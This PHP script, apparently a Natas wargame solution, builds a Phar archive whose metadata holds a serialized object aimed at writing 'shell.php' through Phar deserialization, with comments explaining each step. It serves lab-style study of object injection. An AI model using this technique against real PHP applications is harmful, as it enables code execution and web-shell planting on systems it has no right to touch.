<?php

// Define a class that will later be serialized into Phar metadata
class Executor {
    // Property to store a filename, possibly where malicious payload might be written
    private $filename = "shell.php";

    // A signature flag, possibly used in custom deserialization logic
    private $signature = True;

    // Initialization flag, might affect logic during object restoration
    private $init = false;
}

// Create a new Phar archive named 'natas.phar'
$phar = new Phar('natas.phar');

// Begin buffering changes so they are applied in one go
$phar->startBuffering();

// Add a dummy file inside the Phar archive
$phar->addFromString('test.txt', 'text'); // file content: 'text'

// Set the stub (header) of the Phar archive — this is PHP code run when the Phar is loaded
$phar->setStub('<?php __HALT_COMPILER(); ? >'); // ensures it's a valid PHP Phar archive

// Instantiate the object we want to serialize into the Phar's metadata
$object = new Executor();

// Add a new public property to the object (optional, not used by class directly)
$object->data = 'rips';

// Set the object as the **Phar archive metadata**
// This is critical — during deserialization, this object may be executed if `__wakeup()` or similar is defined
$phar->setMetadata($object);

// Finalize and write the Phar archive to disk
$phar->stopBuffering();

/*
After execution:
  - natas.phar contains:
      - A stub
      - A file (`test.txt`)
      - Serialized metadata (the Executor object)
  - If PHP's Phar stream wrapper is abused and deserialized automatically by a vulnerable app,
    the object can trigger code execution (e.g., if Executor had __destruct or __wakeup).
*/
?>